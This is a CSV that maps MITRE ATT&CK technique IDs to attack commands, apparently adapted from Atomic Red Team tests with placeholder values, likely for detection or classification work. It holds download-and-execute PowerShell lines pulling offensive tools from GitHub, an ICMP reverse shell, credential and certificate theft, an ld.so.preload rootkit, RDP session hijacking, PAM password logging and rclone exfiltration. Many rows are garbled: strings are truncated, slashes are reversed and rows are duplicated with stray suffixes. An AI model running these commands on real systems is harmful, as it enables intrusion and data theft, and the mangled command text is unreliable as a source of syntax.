mitre_id,command
T1095,"cmd \c ""var_742"
T1609,kubectl create -f var_13677
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""var_106"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)> /dev/null 2>&1 # id_75"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_682"" -verbose"
T1140,"encoded=$(echo 'var_18163"""
T1569,"""pathtoatomicsfolder\..\externalpayloads\remcom.exe"" \\var_904 cmd.exe"
T1090,"invoke-expression 'cmd \c start powershell -command {cmd \c ""var_888' sleep -s 60 stop-process -name ""tor"" | out-null"
T1030,$file  =  [system.io.file]::openread(var_13515  $file.close()
T1615,get-gpo -domain $env:userdnsdomain var_23245
T1489,net.exe stop var_98210
T1124,net time \\var_52562 w32tm \tz
T1486,openssl  enc  var_942
T1555,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/creds/master/obfuscatedps/dumpwcm.ps1') invoke-wcmdump
T1555,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpweb.ps1') invoke-sharpweb -command ""all""> /dev/null 2>&1 # id_60"
T1560,"which_python=`which python || which python3` $which_python -c ""import gzip;input_file=open('var_608','wb',compresslevel=6);output_file.write(content);output_file.close();"""
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_80459""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1090,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor"
T1204,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f> /dev/null 2>&1 # id_45"
T1005,"$startingdirectory = ""var_491"
T1574,sudo sh -c 'echo var_41592 > \etc\ld.so.preload'
T1201,cat \etc\pam.d\common-password> /dev/null 2>&1 # id_82
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_5651"
T1548,"""var_801"""
T1497,ping  -c  var_62275
T1020,"$sampledata  =  ""sample  data  for  exfiltration  test""  set-content  -path  ""var_750""  -credential  $creds"
T1222,chmod  var_84566
T1053,"kubectl run var_748 && at -l"""
T1090,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
T1027,"""pathtoatomicsfolder\..\externalpayloads\temp_t1027.zip\t1027.exe"""
T1112,set-itemproperty -force -path 'hklm:\system\currentcontrolset\control\securityproviders\wdigest' -name 'uselogoncredential' -value '1' -erroraction ignore
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""; echo 69 > $null"
T1020,"$filename = ""var_658"
T1204,"echo var url = ""var_839"
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard""> /dev/null 2>&1 # id_16"
T1114,"$secure_pwd = ""var_390"""
T1133,"$extlist  =  var_7706  start  chrome  start-sleep  -seconds  30  stop-process  -name  ""chrome"""
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_3266"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_1765"
T1030,$file = [system.io.file]::openread(var_10352 $file.close()
T1491,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""var_40773"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force"
T1552,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential $users = get-msoluser -all; foreach($user in $users) {$props = @();$user | get-member | foreach-object{$props+=$_.name}; foreach($prop in $props) {if($user.$prop -like ""*password*"") {(""[*]"" + $user.userprincipalname + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\t1552.005test1.txt -append -force}}} get-content -path $env:temp\t1552.005test1.txt -erroraction silentlycontinue"
T1530,aws  --no-sign-request  s3  cp  --recursive  s3:\\var_952
T1530,"$storage_account_objects = import-csv -path ""var_105"
T1486,$which_7z a -pvar_469
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_52849"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1217,dir /s /b %userprofile%\favorites
T1127,"copy ""var_325 \t:library %temp%\libhello.js"
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive> /dev/null 2>&1 # id_48
T1055,$process = start-process var_186 -passthru $pathtoatomicsfolder\t1055\bin\x64\rtlcreateuserthread.exe -pid $process.id -debug
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_8793
T1114,"$secure_pwd = ""var_689"""
T1005,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_474  of  notesfolder'  -e  'repeat  with  afile  in  notesfiles'  -e  'duplicate  afile  to  folder  destinationfolderpath  with  replacing'  -e  'end'  -e  'end  tell'"
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""var_103"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_8421"
T1570,new-smbmapping  -remotepath  'var_85477'  'z:\'
T1564,md var_459
T1613,podman  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  podman  run  --name  t1613_container  --rm  -d  -t  t1613  podman  ps  podman  stats  --no-stream  podman  inspect  $(podman  ps  -l  -q  --filter  ancestor=t1613)> /dev/null 2>&1 # id_85
T1133,"$extlist = var_83557 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1114,"$secure_pwd = ""var_59392"""
T1491,"echo """" | ""var_878"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1040,sudo  var_70236  -t  3
T1072,"""%programfiles(x86)%\var_417"""
T1555,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1555\src\t1555-macrocode.txt"" -officeproduct ""word"" -sub ""extract"""
T1007,schtasks  \query  \fo  list  \v
T1615,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gpoaudit -noninteractive -consoleoutput# run_4567
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_53515"" net start sesshijack"
T1123,$mic  =  get-audiodevice  -recording  set-audiodevice  -id  $mic.id  start-sleep  -seconds  5> /dev/null 2>&1 # id_96
T1014,sudo insmod #{rootkit_path}/#{rootkit_name}.ko
T1125,reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestart  \t  reg_binary  \d  a273b6f07104d601  \f  reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestop  \t  reg_binary  \d  96ef514b7204d601  \f> /dev/null 2>&1 # id_88
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh# run_8580
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_68761"" net start sesshijack"
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_215"""
T1129,"var_341"""
T1573,$server_ip = var_327
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_73689"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1485,"if (-not (test-path ""var_72369"""
T1113,import -window root var_31514
T1572,nohup var_832 >\dev\null 2>&1 &
T1548,"iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') uacbypass -noninteractive -command ""%systemroot%\system32\cmd.exe"" -technique diskcleanup"
T1539,"killall  'google  chrome'  sleep  1  open  -a  ""\applications\google  chrome.app\contents\macos\google  chrome""  --args  --remote-debugging-port=1337  --remote-allow-origins=http:\\localhost\  sleep  1  \tmp\whitechocolatemacademianut\chocolate  -d  cookies  -p  1337"
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx""# run_6005"
T1030,$file = [system.io.file]::openread(var_939 $file.close()
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=organizationalunit) var_63932"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_394
T1036,"expand-archive  -path  ""pathtoatomicsfolder\..\externalpayloads\t1036.zip""  -destinationpath  ""$env:userprofile\downloads\t1036""  -force  cd  ""$env:userprofile\downloads\t1036""  cmd  \c  ""$env:userprofile\downloads\t1036\readme.cmd""  >$null  2>$null> /dev/null 2>&1 # id_29"
T1219,"start-process ""#{remotepc_path}"""
T1129,"var_617"""
T1580,"export aws_region=var_94901 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1485,"if (-not (test-path ""var_536"""
T1005,"$startingdirectory = ""var_784"
T1505,"$termsrvdll  =  ""%systemroot%\system32\termsrv.dll""  $acl  =  get-acl  $termsrvdll  $permission  =  ""administrators"",""fullcontrol"",""allow""  $accessrule  =  new-object  system.security.accesscontrol.filesystemaccessrule  $permission  $acl.setaccessrule($accessrule)  set-acl  -path  $termsrvdll  -aclobject  $acl  copy-item  -path  $termsrvdll  -destination  ""$home\atomictest.dll""  $newservicedll  =  ""$home\atomictest.dll""  $registrypath  =  ""hklm:\system\currentcontrolset\services\termservice\parameters""  #  check  if  the  registry  key  exists  if  (test-path  -path  $registrypath)  {  #  modify  the  servicedll  value  in  the  registry  set-itemproperty  -path  $registrypath  -name  ""servicedll""  -value  $newservicedll  write-host  ""servicedll  value  in  the  registry  has  been  updated  to:  $newservicedll""  }  else  {  write-host  ""registry  key  not  found.  make  sure  the  'termservice\parameters'  key  exists.""  }"
T1187,rpcping  -s  var_936  \a  connect  \u  ntlm  1>$null
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_766
T1133,"$extlist = var_323 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') winpeas -noninteractive -consoleoutput> /dev/null 2>&1 # id_48
T1046,docker  build  -t  t1046  $pathtoatomicsfolder\t1046\src\  docker  run  --name  t1046_container  --rm  -d  -t  t1046  docker  exec  t1046_container  \scan.sh> /dev/null 2>&1 # id_91
T1137,"# registry setting to ""trust access to the vba project object model"" in word $registrykey = ""hkcu:software\microsoft\office\16.0\word\security"" $registryvalue = ""accessvbom"" $registrydata = ""1"" # the path where a flag text file will be created if registry setting did not already exist or if it was set to 0 $flagpath1 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag1.txt"" $flagpath2 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag2.txt"" # get the value of the key/value pair $value = (get-itemproperty -path $registrykey -name $registryvalue -erroraction silentlycontinue).$registryvalue # logical operation to: if the value of the key/value is 1, do nothing - # if the value is 0, change it to 1 and create flag1 - # if it doesn't exist, create the value and flag2 if ($value -eq ""1"") { write-host ""the registry value '$registryvalue' already exists with the required setting."" } elseif ($value -eq ""0"") { write-host ""the registry value was set to 0, temporarily changing to 1."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag1"" > $flagpath1 } else { write-host ""the registry value '$registryvalue' does not exist, temporarily creating it."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag2"" > $flagpath2 } add-type -assemblyname microsoft.office.interop.word # define the path of copied normal template for restoral $copypath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal1.dotm"" # define the path to the normal template $docpath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal.dotm"" # create copy of orginal template for restoral copy-item -path $docpath -destination $copypath -force # vba code to be insterted as a macro # will create a scheduled task to open the calculator at 8:04pm daily $vbacode = @"" sub autoexec() dim applicationpath as string dim taskname as string dim runtime as string dim schtaskscmd as string applicationpath = ""c:\windows\system32\calc.exe"" taskname = ""opencalctask"" runtime = ""20:04"" schtaskscmd = ""schtasks /create /tn """""" & taskname & """""" /tr """""" & applicationpath & """""" /sc daily /st "" & runtime & "" /f"" shell ""cmd.exe /c "" & schtaskscmd, vbnormalfocus end sub ""@ # create a new instance of word.application $word = new-object -comobject word.application # keep the word application hidden $word.visible = $false # open the document $document = $word.documents.open($docpath) # access the vba project of the document $vbaproject = $document.vbproject # add a new module to the vba project $newmodule = $vbaproject.vbcomponents.add(1) # 1 = vbext_ct_stdmodule # add the vba code to the new module $newmodule.codemodule.addfromstring($vbacode) # run the macro $word.run(""autoexec"") # save and close the document $document.saveas($docpath) $document.close() # quit word $word.quit() # release com objects [system.runtime.interopservices.marshal]::releasecomobject($document) | out-null [system.runtime.interopservices.marshal]::releasecomobject($word) | out-null [system.runtime.interopservices.marshal]::releasecomobject($vbaproject) | out-null [system.runtime.interopservices.marshal]::releasecomobject($newmodule) | out-null"
T1218,"hh.exe ""#{local_chm_file}"""
T1187,rpcping  -s  var_89995  \a  connect  \u  ntlm  1>$null
T1560,mkdir -p var_85140
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_89790 -method post -body $cyphertext -disablekeepalive"
T1202,forfiles /p c:\windows\system32 /m notepad.exe /c #{process}# run_5365
T1133,"$extlist = var_816 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1133,"$extlist = var_522 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1056,"cp -v \etc\pam.d\sshd \tmp\ echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> \etc\pam.d\sshd systemctl restart sshd systemctl restart auditd ssh var_55752@localhost whoami sudo su whoami exit exit"
T1613,podman  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  podman  run  --name  t1613_container  --rm  -d  -t  t1613  podman  ps  podman  stats  --no-stream  podman  inspect  $(podman  ps  -l  -q  --filter  ancestor=t1613)> /dev/null 2>&1 # id_93
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh> /dev/null 2>&1 # id_79
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_343"" net start sesshijack"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_84224"" -verbose"
T1518,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" \v svcversion"
T1014,"echo var_858 | tee -a \etc\ld.so.preload \usr\local\bin\evil_script.py localhost -c 10 >\dev\null & pgrep -l evil_script.py || echo ""process hidden"""
T1566,$url = 'https:\\github.com\redcanaryco\atomic-red-team\raw\master\atomics\t1566.001\bin\phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm
T1187,"& ""var_175 write-host ""end of petitpotam attack"""
T1485,dd of=var_896') iflag=count_bytes
T1497,"if  [  ""$(sysctl  -n  hw.hv_vendor)""  !=  """"  ];  then  echo  ""virtualization  environment  detected"";  fi# run_1100"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_71894
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_272"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt# run_6603"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_788
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 5"
T1014,"echo var_436 | tee -a \etc\ld.so.preload \usr\local\bin\evil_script.py localhost -c 10 >\dev\null & pgrep -l evil_script.py || echo ""process hidden"""
T1016,"$ports = get-content ""var_36058 $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results"
T1007,net.exe start >> var_40470
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_5370"
T1221,"start ""var_622"""
T1113,screencapture -x var_47799
T1562,echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_766 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file}"
T1048,"$rclone_bin = get-childitem c:\users\backup_svc\downloads\ -recurse -include ""rclone.exe"" | select-object -expandproperty fullname $exfil_pack = get-childitem c:\users\svc_account\downloads\ -recurse -include ""exfil.zip"" | select-object -expandproperty fullname &$rclone_bin config create ftpserver ""ftp"" ""host"" var_36110 &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2m -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -p --ftp-no-check-certificate"
T1120,"get-wmiobject  win32_pnpentity  |  format-table  name,  description,  manufacturer  >  $env:temp\t1120_collection.txt  $space,$heading,$break,$data  =  get-content  $env:temp\t1120_collection.txt  @($heading;  $break;  $data  |sort-object  -unique)  |  ?  {$_.trim()  -ne  """"  }  |set-content  $env:temp\t1120_collection.txt# run_2566"
T1083,"$folderarray = @(""desktop"", ""downloads"", ""documents"", ""appdata\local"", ""appdata\roaming"") get-childitem -path $env:homedrive -erroraction silentlycontinue | out-file -append var_935"
T1083,dir \s c:\ >> var_78490
T1574,"write-host 1.downloading keyscrambler from official website to temp directory invoke-webrequest -uri ""https://download.qfxsoftware.com/download/latest/keyscrambler_setup.exe"" -outfile $env:temp\keyscrambler_setup.exe write-host 2.installing keyscrambler with keyscrambler_setup.exe from temp directory start-process -filepath $env:temp\keyscrambler_setup.exe -argumentlist /s -wait write-host 3.copying keyscrambler.exe to temp folder,to avoid permission issues, which calls keyscramblerie.dll in cwd i.e. temp copy-item ""c:\program files (x86)\keyscrambler\keyscrambler.exe"" -destination $env:temp\keyscrambler.exe write-host 4.executing keyscrambler.exe, you should see a popup of missing keyscramblerie.dll, you can close this popup start-process -filepath $env:temp\keyscrambler.exe write-host 5.a modified keyscramblerie.dll can be copied to temp, which can be misused by attacker"
T1046,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') fruit -noninteractive -consoleoutput
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_9132"
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe \out:""var_157"" %tmp%\t1106.exe"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_721"
T1539,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_14939""'  -e  'set  safarifolder  to  ((path  to  library  folder  from  user  domain  as  text)  &  ""containers:com.apple.safari:data:library:cookies:"")'  -e  'duplicate  file  ""cookies.binarycookies""  of  folder  safarifolder  to  folder  destinationfolderpath  with  replacing'  -e  'end  tell'"
T1218,"infdefaultinstall.exe ""#{inf_to_execute}""> /dev/null 2>&1 # id_40"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_99955"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1222,chmod -r var_707
T1016,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe""  -f  (objectcategory=subnet)  var_72250"
T1001,"cat ""var_850"" | tail -n 1 | base64 -d | sh"
T1124,net time \\var_95536 w32tm \tz
T1578,"aws ec2 create-snapshot --region var_678 --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1030,cd  var_242
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_638"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1074,"invoke-webrequest  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat""  -outfile  var_65211"
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}> /dev/null 2>&1 # id_74
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""var_899"" -destination ""%systemroot%\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $notificationpackagesvalues = $lsakey.getvalue(""notification packages"") $notificationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""notification packages"" $notificationpackagesvalues"
T1486,"set-content  -path  ""var_580`"""""
T1135,"invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'; echo 96 > $null"
T1046,nmap var_253
